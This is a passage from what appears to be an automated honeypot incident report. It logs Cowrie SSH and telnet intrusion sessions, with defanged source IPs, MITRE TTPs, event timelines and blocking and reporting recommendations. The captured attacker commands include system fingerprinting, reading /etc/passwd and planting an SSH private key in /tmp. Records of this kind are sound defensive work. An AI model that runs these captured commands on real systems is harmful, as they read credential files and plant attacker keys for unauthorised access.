| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.log.closed` |
| `2026-08-26 01:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7976cbae16f3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:10 |
| **Last Seen** | 2026-08-26 01:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:10:55` | `cowrie.session.connect` |
| `2026-08-26 01:10:55` | `cowrie.client.version` |
| `2026-08-26 01:10:55` | `cowrie.client.kex` |
| `2026-08-26 01:10:56` | `cowrie.login.success` |
| `2026-08-26 01:10:57` | `cowrie.session.params` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.success` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.command.input` |
| `2026-08-26 01:10:57` | `cowrie.log.closed` |
| `2026-08-26 01:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db42271ded65

| Field | Detail |
|---|---|
| **Source IP** | `138.2.102[.]66` |
| **First Seen** | 2026-08-26 01:11 |
| **Last Seen** | 2026-08-26 01:12 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:11:07` | `cowrie.session.connect` |
| `2026-08-26 01:11:10` | `cowrie.telnet.option` |
| `2026-08-26 01:11:12` | `cowrie.telnet.option` |
| `2026-08-26 01:11:12` | `cowrie.login.success` |
| `2026-08-26 01:11:12` | `cowrie.session.params` |
| `2026-08-26 01:11:14` | `cowrie.telnet.option` |
| `2026-08-26 01:11:14` | `cowrie.telnet.option` |
| `2026-08-26 01:11:14` | `cowrie.command.input` |
| `2026-08-26 01:11:14` | `cowrie.command.input` |
| `2026-08-26 01:11:14` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.failed` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:11:16` | `cowrie.command.input` |
| `2026-08-26 01:12:18` | `cowrie.log.closed` |
| `2026-08-26 01:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.2.102[.]66` to AbuseIPDB if not already reported
- [ ] Block `138.2.102[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dbc8da6bf9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:12 |
| **Last Seen** | 2026-08-26 01:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:12:05` | `cowrie.session.connect` |
| `2026-08-26 01:12:05` | `cowrie.client.version` |
| `2026-08-26 01:12:06` | `cowrie.client.kex` |
| `2026-08-26 01:12:06` | `cowrie.login.success` |
| `2026-08-26 01:12:07` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:12:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:12:07` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c62557c7a0d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:12 |
| **Last Seen** | 2026-08-26 01:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:12:09` | `cowrie.session.connect` |
| `2026-08-26 01:12:09` | `cowrie.client.version` |
| `2026-08-26 01:12:09` | `cowrie.client.kex` |
| `2026-08-26 01:12:10` | `cowrie.login.success` |
| `2026-08-26 01:12:10` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:12:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:12:10` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc6d119ef33

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:13 |
| **Last Seen** | 2026-08-26 01:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:13:30` | `cowrie.session.connect` |
| `2026-08-26 01:13:30` | `cowrie.client.version` |
| `2026-08-26 01:13:30` | `cowrie.client.kex` |
| `2026-08-26 01:13:32` | `cowrie.login.success` |
| `2026-08-26 01:13:33` | `cowrie.session.params` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.success` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.command.input` |
| `2026-08-26 01:13:33` | `cowrie.log.closed` |
| `2026-08-26 01:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde086e3f881

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:15 |
| **Last Seen** | 2026-08-26 01:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:15:14` | `cowrie.session.connect` |
| `2026-08-26 01:15:14` | `cowrie.client.version` |
| `2026-08-26 01:15:14` | `cowrie.client.kex` |
| `2026-08-26 01:15:15` | `cowrie.login.success` |
| `2026-08-26 01:15:17` | `cowrie.session.params` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.success` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.command.input` |
| `2026-08-26 01:15:17` | `cowrie.log.closed` |
| `2026-08-26 01:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25580b61acd6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:16 |
| **Last Seen** | 2026-08-26 01:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:16:50` | `cowrie.session.connect` |
| `2026-08-26 01:16:50` | `cowrie.client.version` |
| `2026-08-26 01:16:50` | `cowrie.client.kex` |
| `2026-08-26 01:16:52` | `cowrie.login.success` |
| `2026-08-26 01:16:54` | `cowrie.session.params` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.success` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.command.input` |
| `2026-08-26 01:16:54` | `cowrie.log.closed` |
| `2026-08-26 01:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d12ef9d7686

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:21 |
| **Last Seen** | 2026-08-26 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:21:40` | `cowrie.session.connect` |
| `2026-08-26 01:21:40` | `cowrie.client.version` |
| `2026-08-26 01:21:40` | `cowrie.client.kex` |
| `2026-08-26 01:21:41` | `cowrie.login.success` |
| `2026-08-26 01:21:41` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:21:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:21:42` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4e3fc74d1a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:21 |
| **Last Seen** | 2026-08-26 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:21:44` | `cowrie.session.connect` |
| `2026-08-26 01:21:44` | `cowrie.client.version` |
| `2026-08-26 01:21:44` | `cowrie.client.kex` |
| `2026-08-26 01:21:45` | `cowrie.login.success` |
| `2026-08-26 01:21:45` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:21:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:21:45` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1732086c81d8

| Field | Detail |
|---|---|
| **Source IP** | `8.219.220[.]7` |
| **First Seen** | 2026-08-26 01:25 |
| **Last Seen** | 2026-08-26 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:25:25` | `cowrie.session.connect` |
| `2026-08-26 01:25:25` | `cowrie.client.version` |
| `2026-08-26 01:25:25` | `cowrie.client.kex` |
| `2026-08-26 01:25:26` | `cowrie.login.success` |
| `2026-08-26 01:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.220[.]7` to AbuseIPDB if not already reported
- [ ] Block `8.219.220[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86708d8fd14d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-26 01:25 |
| **Last Seen** | 2026-08-26 01:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:25:26` | `cowrie.session.connect` |
| `2026-08-26 01:25:26` | `cowrie.client.version` |
| `2026-08-26 01:25:26` | `cowrie.client.kex` |
| `2026-08-26 01:25:26` | `cowrie.login.success` |
| `2026-08-26 01:25:28` | `cowrie.session.params` |
| `2026-08-26 01:25:28` | `cowrie.command.input` |
| `2026-08-26 01:25:28` | `cowrie.session.file_download` |
| `2026-08-26 01:25:28` | `cowrie.session.file_download` |
| `2026-08-26 01:25:28` | `cowrie.log.closed` |
| `2026-08-26 01:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a9a4fecfa0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:30 |
| **Last Seen** | 2026-08-26 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:30:55` | `cowrie.session.connect` |
| `2026-08-26 01:30:55` | `cowrie.client.version` |
| `2026-08-26 01:30:55` | `cowrie.client.kex` |
| `2026-08-26 01:30:56` | `cowrie.login.success` |
| `2026-08-26 01:30:56` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:30:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:30:56` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb4497bef7d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:30 |
| **Last Seen** | 2026-08-26 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:30:58` | `cowrie.session.connect` |
| `2026-08-26 01:30:58` | `cowrie.client.version` |
| `2026-08-26 01:30:59` | `cowrie.client.kex` |
| `2026-08-26 01:30:59` | `cowrie.login.success` |
| `2026-08-26 01:31:00` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:31:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:31:00` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f8d713bf70

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 01:34 |
| **Last Seen** | 2026-08-26 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:34:32` | `cowrie.session.connect` |
| `2026-08-26 01:34:32` | `cowrie.client.version` |
| `2026-08-26 01:34:32` | `cowrie.client.kex` |
| `2026-08-26 01:34:32` | `cowrie.login.success` |
| `2026-08-26 01:34:33` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:34:33` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452d5d6cf3af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:40 |
| **Last Seen** | 2026-08-26 01:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:40:23` | `cowrie.session.connect` |
| `2026-08-26 01:40:23` | `cowrie.client.version` |
| `2026-08-26 01:40:23` | `cowrie.client.kex` |
| `2026-08-26 01:40:24` | `cowrie.login.success` |
| `2026-08-26 01:40:24` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:40:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:40:24` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ab18fecc35

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:40 |
| **Last Seen** | 2026-08-26 01:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:40:27` | `cowrie.session.connect` |
| `2026-08-26 01:40:27` | `cowrie.client.version` |
| `2026-08-26 01:40:27` | `cowrie.client.kex` |
| `2026-08-26 01:40:28` | `cowrie.login.success` |
| `2026-08-26 01:40:28` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:40:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:40:28` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b47b802aed

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 01:46 |
| **Last Seen** | 2026-08-26 01:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:46:25` | `cowrie.session.connect` |
| `2026-08-26 01:46:25` | `cowrie.client.version` |
| `2026-08-26 01:46:25` | `cowrie.client.kex` |
| `2026-08-26 01:46:25` | `cowrie.login.success` |
| `2026-08-26 01:46:25` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:46:25` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1384ded78e95

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:49 |
| **Last Seen** | 2026-08-26 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
